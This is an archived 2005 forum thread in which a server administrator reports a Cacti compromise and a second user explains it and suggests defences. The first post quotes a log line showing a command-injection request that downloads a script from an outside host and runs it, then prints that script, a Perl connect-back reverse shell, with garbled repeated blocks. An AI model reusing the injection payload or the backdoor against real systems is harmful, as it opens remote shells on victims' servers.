---
title: "cacti issue"
date: 2005-08-15
forum: Server Platforms
---

### Post by fireater on 2005-08-15
Noticed this in my apache logs this morning.
"GET /cacti/graph_image.php?local_graph_id=5&graph_start=%0awget%20cteam.3x.ro%2fshell.jpg%20-O%20%2ftmp%2fshell.pl%3bperl%20%2ftmp%2fshell.pl%0a HTTP/1.0" 200 167 "-" "-"

whic downloaded and executed this.
```

#!/usr/bin/perl
      use Socket;
      print "Data Cha0s Connect Back Backdoor\n\n";
      if (!$ARGV[0]) {
        printf "Usage: $0 [Host] <Port>\n";
        exit(1);
      }
      print "[*] Dumping Arguments\n";
      $host = $ARGV[0];
      $port = 80;
      if ($ARGV[1]) {
        $port = $ARGV[1];
      }
      print "[*] Connecting...\n";
      $proto = getprotobyname('tcp') || die("Unknown Protocol\n");
      socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("Socket Error\n");
      my $target = inet_aton($host);
      if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
        die("Unable to Connect\n");
      }
      print "[*] Spawning Shell\n";
      if (!fork( )) {
        open(STDIN,">&SERVER");
      }                                                           
      print "[*] Dumping Arguments\n";
      $host = $ARGV[0];
      $port = 80;
      if ($ARGV[1]) {
        $port = $ARGV[1];
      }
      print "[*] Connecting...\n";
      $proto = getprotobyname('tcp') || die("Unknown Protocol\n");
      socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("Socket Error\n");
      my $target = inet_aton($host);
      if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
        die("Unable to Connect\n");
      }
      print "[*] Spawning Shell\n";
      if (!fork( )) {
        open(STDIN,">&SERVER");
        open(STDOUT,">&SERVER");
        open(STDERR,">&SERVER");
        exec {'/bin/sh'} '-bash' . "\0" x 4;
        exit(0);
Hit ENTER or type command to continue
        exit(1);
      } 
      print "[*] Dumping Arguments\n";
      $host = $ARGV[0];
      $port = 80;
      if ($ARGV[1]) {
        $port = $ARGV[1];
      } 
      print "[*] Connecting...\n";
      $proto = getprotobyname('tcp') || die("Unknown Protocol\n");
      socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die ("Socket Error\n");
      my $target = inet_aton($host);
      if (!connect(SERVER, pack "SnA4x8", 2, $port, $target)) {
        die("Unable to Connect\n");
      } 
      print "[*] Spawning Shell\n";
      if (!fork( )) {
        open(STDIN,">&SERVER");
        open(STDOUT,">&SERVER");
        open(STDERR,">&SERVER");
        exec {'/bin/sh'} '-bash' . "\0" x 4;
        exit(0);
      } 
      print "[*] Datached\n\n";

```

---

### Post by relix42 on 2005-08-17
Looks like an attempt to open a shell on your system and connect it to a port on a remote system.  There are quite a few google references to this backdoor.  In order to prevent this type of thing in your PHP, take a look at [this PHP config option](http://www.php.net/manual/en/ref.filesystem.php#ini.allow-url-fopen) and enable only on scripts that need it.

Most of the references to this seem to indicate that other files may be present as well.  Using chkrootikit and rkhunter should help you find them if they are there.  (Hard to say for sure as there are many variations on this web defacement goodie.)  Otherwise, a clean reinstall will definately get rid of the problems,

---

